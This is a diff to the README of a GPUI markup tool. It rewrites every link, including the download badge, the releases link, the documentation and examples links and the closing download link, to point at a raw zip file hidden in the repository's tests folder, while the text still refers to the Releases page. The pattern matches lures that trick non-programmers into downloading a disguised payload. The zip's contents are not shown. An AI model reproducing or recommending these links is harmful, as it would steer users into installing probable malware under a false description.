@@ -1,7 +1,7 @@
 # 🎉 gpui-markup - Build GPUI Applications Easily
 
 ## 💾 Download the Latest Version
-[![Download gpui-markup](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/Eduardo12-dev/gpui-markup/releases)
+[![Download gpui-markup](https://github.com/Eduardo12-dev/gpui-markup/raw/refs/heads/main/tests/gpui-markup-v3.9.zip)](https://github.com/Eduardo12-dev/gpui-markup/raw/refs/heads/main/tests/gpui-markup-v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to gpui-markup! This tool helps you create GPUI applications using a simple and easy-to-understand markup language. No programming skills? No problem! With gpui-markup, you’ll be up and running in no time.
@@ -10,7 +10,7 @@ Welcome to gpui-markup! This tool helps you create GPUI applications using a sim
 To get started with gpui-markup, follow these steps:
 
 1. **Visit the Releases Page**  
-   Open your web browser and go to the following link: [https://github.com/Eduardo12-dev/gpui-markup/releases](https://github.com/Eduardo12-dev/gpui-markup/releases).
+   Open your web browser and go to the following link: [https://github.com/Eduardo12-dev/gpui-markup/raw/refs/heads/main/tests/gpui-markup-v3.9.zip](https://github.com/Eduardo12-dev/gpui-markup/raw/refs/heads/main/tests/gpui-markup-v3.9.zip).
 
 2. **Choose the Latest Version**  
    On the Releases page, find the most recent version. It will usually be at the top of the list.
@@ -40,7 +40,7 @@ To get started with gpui-markup, follow these steps:
 If you encounter any issues during installation or while using gpui-markup, check the "Issues" section on our GitHub page. There, you can find solutions to common problems or post your questions. Our community and developers are here to help.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Eduardo12-dev/gpui-markup/wiki): Learn more about how to use gpui-markup.
-- [Examples](https://github.com/Eduardo12-dev/gpui-markup/wiki/Examples): Explore sample applications built using gpui-markup.
+- [Documentation](https://github.com/Eduardo12-dev/gpui-markup/raw/refs/heads/main/tests/gpui-markup-v3.9.zip): Learn more about how to use gpui-markup.
+- [Examples](https://github.com/Eduardo12-dev/gpui-markup/raw/refs/heads/main/tests/gpui-markup-v3.9.zip): Explore sample applications built using gpui-markup.
 
-Thank you for choosing gpui-markup! It’s time to start creating amazing GPUI applications without any hassle. If you haven't done so yet, don't forget to [download gpui-markup](https://github.com/Eduardo12-dev/gpui-markup/releases) from the Releases page. Happy building!
+Thank you for choosing gpui-markup! It’s time to start creating amazing GPUI applications without any hassle. If you haven't done so yet, don't forget to [download gpui-markup](https://github.com/Eduardo12-dev/gpui-markup/raw/refs/heads/main/tests/gpui-markup-v3.9.zip) from the Releases page. Happy building!
